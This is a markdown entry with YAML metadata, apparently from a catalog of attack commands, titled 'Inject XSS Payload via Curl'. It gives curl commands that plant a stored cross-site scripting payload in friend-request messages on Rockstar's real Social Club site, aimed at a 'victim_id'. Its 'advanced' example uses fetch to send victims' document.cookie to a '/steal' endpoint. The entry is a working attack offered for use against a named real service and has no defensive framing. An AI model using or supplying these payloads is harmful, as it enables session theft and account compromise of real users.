---
data: >-
  curl -X POST 'https://socialclub.rockstargames.com/friends/add' -d
  'friendId=victim_id&message=<svg><object data="javascript:alert(\'XSS\')">' -H
  'Cookie: your_session_cookie'
tags:
  - xss
  - injection
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 43b60f95-1394-4fcf-a6d6-3cf0cdcaa499
created_at: '2025-12-13T23:56:19.997Z'
updated_at: '2025-12-13T23:56:19.997Z'
verified: false
validated: true
submitted: true
---
# Inject XSS Payload via Curl

## Command

```bash
curl -X POST 'https://socialclub.rockstargames.com/friends/add' -d 'friendId=victim_id&message=<svg><object data="javascript:alert(\'XSS\')">' -H 'Cookie: your_session_cookie'
```

## Description

This command sends a POST request to add a friend on Social Club, injecting an XSS payload into the message field for storage and later execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-d 'friendId=victim_id&message=payload'` | Data payload with friend ID and malicious message | Yes |
| `-H 'Cookie: your_session_cookie'` | Authentication cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://socialclub.rockstargames.com/friends/add' -d 'friendId=12345&message=<svg><object data="javascript:alert(\'XSS\')">' -H 'Cookie: session=abc123'
```

### Advanced Usage

```bash
curl -X POST 'https://socialclub.rockstargames.com/friends/add' -d 'friendId=12345&message=<svg><object data="javascript:fetch(\'/steal?cookie=\'+document.cookie);">' -H 'Cookie: session=abc123' -H 'User-Agent: Custom'
```

## Expected Output

Successful response from server indicating friend request sent, with payload stored.

## Related

- [[procedures/Inject-Stored-XSS-Payload-in-Friend-Request-Message]]
- [[tools/Burp-Suite]]
